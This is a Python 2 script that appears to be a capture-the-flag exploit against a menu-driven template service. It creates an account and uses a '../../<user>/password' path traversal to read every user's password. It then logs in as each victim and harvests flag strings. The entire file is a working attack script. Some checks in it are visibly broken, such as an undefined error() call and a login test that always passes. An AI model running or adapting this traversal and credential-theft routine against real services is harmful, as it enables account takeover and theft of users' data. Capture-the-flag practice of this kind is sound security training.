import socket
import string
import random
import time
import re
import sys


loglevel = 1

def log(msg="", level=0):
  if level < loglevel:
    print msg

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(chars) for _ in range(size))

class Connection(object):
    def __init__(self, target, timeout):
        self.sock = socket.create_connection(target, timeout)
        self.sock.settimeout(timeout)
        self.fh = self.sock.makefile()

    def read_until(self, f):
        if not callable(f):
            f = lambda s, substr=f: substr in s
        buf = ""
        while not f(buf):
            d = self.sock.recv(1)
            assert d
            buf += d
        return buf

    def read_line(self):
        return self.read_until("\n")[:-1]

    def write(self, s):
        self.sock.send(str(s))

    def write_line(self, line):
        self.write(str(line) + "\n")

    def read_all(self):
        buf = ""
        while True:
            d = self.sock.recv(1)
            if not d:
                return buf
            buf += d

#
# Start Main
#
if len(sys.argv) < 3:
  error("Usage: " + sys.argv[0] + " $ip $port")

enemy = sys.argv[1]
port = sys.argv[2] 

timeout = 5
myuser = id_generator(6)
mypass = id_generator(6)

log("[INFO] attacking %s" % enemy, 0)


# connect, wait for prompt
s = Connection((enemy, port), timeout)
dum = s.read_until("What do you want to do? Type the command number:")

# creatue user/pass
s.write_line('1')
dum = s.read_until("Please provide a username and password for your new account")
s.write_line(myuser)
s.write_line(mypass)

# read users
s.write_line('3')
dum = s.read_until("Available users:\n")
remusers = s.read_until("\n-----------").split("\n")
dum = s.read_until("What do you want to do? Type the command number:")
remusers.pop() # the 'last' user is ------- because the way read_line works

log("[INFO] found %d users" % len(remusers), 0)


# login as myuser
s.write_line('2')
s.write_line(myuser)
s.write_line(mypass)
yes = "how are you today"
no = "failed"
login_ok = s.read_until(lambda s: yes in s or no in s)
dum = s.read_until("What do you want to do? Type the command number:")
if login_ok:
  log("[DEG] login okay as user <%s>" % myuser, 1)
else:
  quit()

passwords = {}
# iterate over users
for user in remusers:
  s.write_line('3')
  s.write_line("../../%s/password" % user)
  dum = s.read_until("Template created at ")
  dastring = s.read_until("------------------------------\n")
  mo = re.search('(.*)\n(.*?)---',dastring)
  if mo:
    date = mo.group(1)
    passw = mo.group(2)
    passwords[user] = passw
    log("[DBG] Found Password >>%s<< for user >>%s<< " % (user, passw), 1)

# logout
s.write_line('0')
dum = s.read_until("What do you want to do? Type the command number:")

# now login as each user and steal flags
for user in remusers:
  s.write_line('2')
  s.write_line(user)
  s.write_line(passwords[user])
  login_ok = s.read_until(lambda s: yes in s or no in s)
  dum = s.read_until("What do you want to do? Type the command number:")
  if not login_ok:
    log("[ERR] Failed to login as user %s" % user, 0)
    continue

  log("[INFO] login okay as user <%s>" % user, 1)
  s.write_line('2') 
  dum = s.read_until("Available templates:\n")
  templates = s.read_until("-----------").split("\n")
  dum = s.read_until("What do you want to do? Type the command number:")
  templates.pop() # the 'last' user is ------- because the way read_line works

  log("[INFO] found %d templates" % len(templates), 1)

  for tmpl in templates:
    log("[INFO] retrieving template <%s>" % tmpl, 1)
    s.write_line('3') 
    dum = s.read_until("What's the name of the template you want to show?")
    s.write_line(tmpl) 
    dum = s.read_until("Template created at ")
    dastring = s.read_until("------------\n")

    ma = re.search("\{[a-z0-9]{32}\}",dastring)
    if ma:
      log("[FLAG] %s" % ma.group(0), 0)

  # logout
  s.write_line('0')
  dum = s.read_until("What do you want to do? Type the command number:")

